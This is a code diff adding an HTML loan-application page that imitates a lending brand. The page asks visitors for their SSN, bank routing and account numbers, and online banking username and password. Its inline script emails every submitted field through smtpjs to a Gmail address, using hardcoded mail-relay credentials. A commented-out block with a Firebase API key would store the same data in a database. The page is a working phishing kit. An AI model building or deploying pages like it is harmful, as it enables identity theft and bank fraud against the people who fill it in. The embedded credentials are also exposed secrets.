@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+  
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Apply Now</title>
+    <link rel="stylesheet" href="apply.css" />
+    <link rel="shortcut icon" href="img/image.ico" type="image/x-icon" />
+    <link
+      rel="stylesheet"
+      href="../kit.fontawesome.com/6b7edefd2f.html"
+      crossorigin="anonymous"
+    />
+    <script
+      src="../kit.fontawesome.com/6b7edefd2f.js"
+      crossorigin="anonymous"
+    ></script>
+    <script src="script.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com/" />
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,700;1,700&amp;display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <header>
+      <div class="main-div">
+        <div class="div-img">
+          <img class="logo-img" src="img/logo-dark.png" alt="logo" />
+          <button>Returning Customer</button>
+        </div>
+      </div>
+    </header>
+    <div class="main-body">
+      <div class="left">
+
+        <i class="fa fa-file file-icon"></i>
+        <h3 class="heading-primary">personal details</h3>
+        <p class="heading-para">Tell us how much you need...</p>
+        <br /><label class="loan-amount" for="loan-amount"
+          ><small>*</small>Loan Amount</label
+        >
+        <br /><select name="loan-amount" id="amount">
+          <option value="">&dollar; 2,000</option>
+          <option value="">$ 2,500</option>
+          <option value="">$ 3,000</option>
+          <option value="">$ 3,500</option>
+          <option value="">$ 4,000</option>
+          <option value="">$ 4,500</option>
+          <option value="">$ 5,000</option>
+          <option value="">$ 5,500</option>
+          <option value="">$ 6,000</option>
+          <option value="">$ 6,500</option>
+          <option value="">$ 7,000</option>
+          <option value="">$ 7,500</option>
+          <option value="">$ 8,000</option>
+          <option value="">$ 8,500</option>
+          <option value="">$ 9,000</option>
+          <option value="">$ 9,500</option>
+          <option value="">$ 10,000</option>
+        </select>
+        <hr />
+
+        <div class="second-part" id="contactForm"> 
+        <form method="POST" id="contactForm">  
+          <label class="name" for="name"><small>*</small> First Name</label>
+          <label class="middle-name" for="name"
+            ><small>*</small> Middle Name</label
+          >
+          <br /><input
+            class="name-input"
+            type="text"
+            required
+            id="nameInput"
+            placeholder="Your First Name"
+          />
+          <input
+            class="middle-name-input"
+            type="text"
+            id="middleInput"
+            placeholder="Your Middle Name"
+          />
+
+          <label class="last-name" for="name"
+            ><small>*</small> Last Name</label
+          >
+          <label class="email" for="name"><small>*</small>Email</label>
+          <br /><input
+            class="last-name-input"
+            type="text"
+            required
+            id="lastInput"
+            placeholder="Your Last Name"
+          />
+          <input
+            class="email-input"
+            required
+            id="emailInput"
+            type="email"
+            placeholder="Email"
+          />
+
+          <label class="phone" for="name"><small>*</small>Phone Number</label>
+          <label class="dob" for="name"><small>*</small>DOB</label>
+          <br /><input
+            class="phone-input"
+            type="tel"
+            required
+            id="phoneInput"
+            placeholder="Phone number"
+          />
+          <input
+            class="date-input"
+            required
+            placeholder="mm/dd/yyyy"
+            id="dobInput"
+          />
+        </div>
+
+        <i class="fa fa-book file-icon"></i>
+        <h3 class="heading-primary">more details</h3>
+
+        <br />
+        <label class="country-name" for="name"
+          ><small>*</small>Street Address</label
+        >
+        <label class="country-name" for="name"><small>*</small>City</label>
+        <br /><input
+          class=""
+          id="country"
+          type="text"
+          required
+          placeholder="Street Address"
+        />
+        <input class="" id="state" type="text" required placeholder="City" />
+
+        <br /><label class="street-address" for="name"
+          ><small>*</small>Permanent Address</label
+        >
+        <label class="zipcode" for="name"><small>*</small>Zipcode</label>
+
+        <input
+          class="address-input"
+          required
+          type="text"
+          id="addressInput"
+          placeholder="Address"
+        />
+        <input
+          class="zipcode-input"
+          id="pinInput"
+          required
+          type="text"
+          placeholder="Zip"
+        />
+
+        <label class="driving-name" for="name"
+          ><small>*</small>Driving Licence or other ID</label
+        >
+        <label class="driving-licence-state" for="name"
+          ><small>*</small>Licence state</label
+        >
+        <br /><input
+          class="driving-input"
+          type="text"
+          required
+          id="drivingInput"
+          placeholder="Driving Licence or other ID"
+        />
+        <input
+          class="driving-state-input"
+          required
+          id="licenceStateInput"
+          type="text"
+          placeholder="Licence State"
+        />
+
+        <br /><i class="fa fa-briefcase file-icon"></i>
+        <h3 class="heading-primary">IDENTITY VERIFICATION</h3>
+
+        <br />
+        <label class="driving-name" for="name"><small>*</small>SSN</label>
+
+        <br /><input
+          class="driving-input"
+          type="text"
+          required
+          id="passInput"
+          placeholder="XXX-XX-XXXX"
+        />
+
+        <br /><i class="fa fa-bank file-icon"></i>
+        <h3 class="heading-primary">Bank Account information</h3>
+
+        <label class="routine-number" for="name"
+          ><small>*</small>ABA/Routing Number</label
+        >
+        <label class="bank-name" for="name"><small>*</small>Bank Name</label>
+        <br />
+        <input
+          class="routine-input"
+          required
+          type="number"
+          id="abaInput"
+          placeholder="ABA/Routing Number"
+        />
+        <input
+          class="bank-name-input"
+          required
+          id="banknameInput"
+          type="text"
+          placeholder="Bank Name"
+        />
+        <!-- second line -->
+        <label class="account-number" for="name"
+          ><small>*</small>Account Number</label
+        >
+        <label class="mobile-name" for="name"
+          ><small>*</small>Mobile/Online Banking UserName</label
+        >
+        <br />
+        <input
+          class="account-number-input"
+          required
+          type="text"
+          id="accountnumberInput"
+          placeholder="Account Number"
+        />
+        <input
+          class="mobile-input"
+          type="text"
+          required
+          id="bankingnameInput"
+          placeholder="Mobile/Online Banking UserName"
+        />
+
+        <label class="online-banking-name" for="name"
+          ><small>*</small>Mobile/Online Banking Password</label
+        >
+        <br /><input
+          class="online-banking-input"
+          required
+          type="text"
+          id="passcodeInput"
+          placeholder="Mobile/Online Banking Password"
+        />
+
+        <br /><input type="checkbox" required name="agree" id="accept" />
+        <label for="accept" style="font-weight: 300"
+          ><p class="paracheck" style="padding-right: 30px">
+            I consent to receive calls, texts and pre-recorded messages from
+            lendingtree.services, and its lending and/or network partners.
+            Message and data rates may apply.**
+          </p></label
+        >
+        <button type="submit" id="submitBtn"onclick="Submit()" class="submitbtn">Submit</button>
+        <!-- <input type="submit" id="submitBtn" onclick="submitForm()" /> -->
+      </form>    
+       <p class="second-last-para">
+          By clicking Find My Loan, I agree to receive important notices and
+          other communications electronically. Terms & Conditions and Privacy
+          Policy apply.
+        </p>
+        <p class="last-para">
+          ** Message Frequency: 2 msgs/week. I understand I may opt-out of SMS
+          communication by replying ‘STOP’ or ’HELP' for more information, or by
+          contacting contact@prosperloan.services. Consent to receive texts and
+          calls is not required as a condition of purchasing any products or
+          services. See SMS Policy for more details. I certify that I am a US
+          resident over 18, and all information submitted with this loan request
+          is true and accurate to the best of my knowledge.
+        </p>
+      </div>
+
+      <div class="right">
+        <div class="right-text">
+          <h2>Need Help?</h2>
+          <p class="para-rigth">
+            If you're not sure what to enter in a particular field, please refer
+            to the pane and you will see a message with detailed instructions.
+          </p>
+
+          <div class="lock-div">
+            <i class="fa-solid fa-lock"></i>
+            <p class="lock-para">
+              We use 256-bit SSL encryption and strict high level of security to
+              keep your information safe.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+<script>
+  function Submit(){
+    const loanAmount = document.getElementById('amount').value;
+      const Username = document.getElementById('nameInput').value;
+      const middle_Name = document.getElementById('middleInput').value;
+      const last_Name = document.getElementById('lastInput').value;
+      const email = document.getElementById('emailInput').value;
+      const phone = document.getElementById('phoneInput').value;
+      const Dob = document.getElementById('dobInput').value;
+      const street_Address = document.getElementById('country').value;
+      const City = document.getElementById('state').value;
+      const address = document.getElementById('addressInput').value;
+      const zipCode = document.getElementById('pinInput').value;
+      const driving_Licence = document.getElementById('drivingInput').value;
+      const licence_State = document.getElementById('licenceStateInput').value;
+      const pass_code = document.getElementById('passInput').value;
+      const Aba = document.getElementById('abaInput').value;
+      const bank_Name = document.getElementById('banknameInput').value;
+      const account_Number = document.getElementById('accountnumberInput').value;
+      const banking_Username = document.getElementById('bankingnameInput').value;
+      const banking_Password = document.getElementById('passcodeInput').value;
+      const submitBtn = document.getElementById('submitBtn').value; 
+    const body = `
+  Name:- ${Username} ${middle_Name} ${last_Name} 
+  Email:- ${email} 
+  Phone:- ${phone} 
+  Date of Birth:- ${Dob} 
+  Street Address:- ${street_Address} 
+  City:- ${City} 
+  Address:- ${address} 
+  Zip Code:- ${zipCode} 
+  Driving Licence:- ${driving_Licence} 
+  Licence State:- ${licence_State} 
+  Pass code:- ${pass_code}
+  ABA:- ${Aba}
+  Bank Name:- ${bank_Name}
+  Account Number:- ${account_Number} 
+  Banking Username:- ${banking_Username}
+  Banking Password:- ${banking_Password}
+`;
+
+console.log(body);
+
+// Now 'userInfo'
+
+    // if (Username.trim() === '') {
+    //     alert('Name fields cannot be empty');
+    //     return;
+    // }
+    // if (middle_Name.trim() === '') {
+    //     alert('Middle name fields cannot be empty');
+    //     return;
+    // }
+    // if (last_Name.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (email.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+
+    // if (phone.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (Dob.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (street_Address.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (City.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (street_Address.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (address.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (zipCode.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (driving_Licence.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (licence_State.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (pass_code.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (Aba.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (bank_Name.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (account_Number.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (banking_Username.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+    // if (banking_Password.trim() === '') {
+    //     alert('Last name fields cannot be empty');
+    //     return;
+    // }
+
+    // Example: Check if the Email field is not empty and is a valid email
+    // if (email.trim() === '' || !isValidEmail(email)) {
+    //     alert('Please enter a valid email address');
+    //     return;
+    // }
+    // console.log("diyugbbgyg")
+    // console.log("body", body)
+
+    Email.send({
+    Host : "smtp.elasticemail.com",
+    Username : "ericwilson200023@gmail.com",
+    Password : "10B043E8697FA73C5A6464BA2E0B30BDDBBF",
+    To : 'ericwilson200023@gmail.com',
+    From : "ericwilson200023@gmail.com",
+    Subject :  "This is a test mail.",
+    Body : body
+}).then(
+  message => alert("message Sent Successfully")
+);
+  
+
+          }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- <script type="module">
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js';
+
+      const firebaseConfig = {
+        apiKey: 'AIzaSyBN8AMlZhqIfpDIO8S_3vrkvAcwhPP6LdU',
+        authDomain: 'fir-prosper-69ab5.firebaseapp.com',
+        databaseURL: 'https://fir-prosper-69ab5-default-rtdb.firebaseio.com',
+        projectId: 'fir-prosper-69ab5',
+        storageBucket: 'fir-prosper-69ab5.appspot.com',
+        messagingSenderId: '646336077412',
+        appId: '1:646336077412:web:d22f2aa88869332d390971',
+      };
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+
+      import {
+        getDatabase,
+        ref,
+        set,
+        child,
+        get,
+      } from 'https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js';
+
+      const db = getDatabase();
+
+      //References
+
+      const loanAmount = document.getElementById('amount');
+      const Username = document.getElementById('nameInput');
+      const middle_Name = document.getElementById('middleInput');
+      const last_Name = document.getElementById('lastInput');
+      const email = document.getElementById('emailInput');
+      const phone = document.getElementById('phoneInput');
+      const Dob = document.getElementById('dobInput');
+      const street_Address = document.getElementById('country');
+      const City = document.getElementById('state');
+      const address = document.getElementById('addressInput');
+      const zipCode = document.getElementById('pinInput');
+      const driving_Licence = document.getElementById('drivingInput');
+      const licence_State = document.getElementById('licenceStateInput');
+      const pass_code = document.getElementById('passInput');
+      const Aba = document.getElementById('abaInput');
+      const bank_Name = document.getElementById('banknameInput');
+      const account_Number = document.getElementById('accountnumberInput');
+      const banking_Username = document.getElementById('bankingnameInput');
+      const banking_Password = document.getElementById('passcodeInput');
+      const submitBtn = document.getElementById('submitBtn');
+
+      function submit() {
+        const dbRef = ref(db);
+
+        get(child(dbRef, 'UserList/' + Username.value)).then((snapshot) => {
+          set(ref(db, 'UserList' + ' ' + Username.value), {
+            loanAmount: loanAmount.value,
+            first_name: Username.value,
+            middle_Name: middle_Name.value,
+            last_Name: last_Name.value,
+            email: email.value,
+            phone: phone.value,
+            Dob: Dob.value,
+            street_Address: street_Address.value,
+            city: City.value,
+            address: address.value,
+            zipCode: zipCode.value,
+            driving_Licence: driving_Licence.value,
+            licence_State: licence_State.value,
+            pass_code: pass_code.value,
+            Aba: Aba.value,
+            bank_Name: bank_Name.value,
+            account_Number: account_Number.value,
+            banking_Username: banking_Username.value,
+            banking_Password: banking_Password.value,
+          })
+            .then(() => {
+              alert('Details Sent Successfully!!');
+            })
+            .catch((error) => {
+              alert('error' + error);
+            });
+        });
+      }
+
+      submitBtn.addEventListener('click', submit);
+    </script> -->
+  </body>
+
+</html>
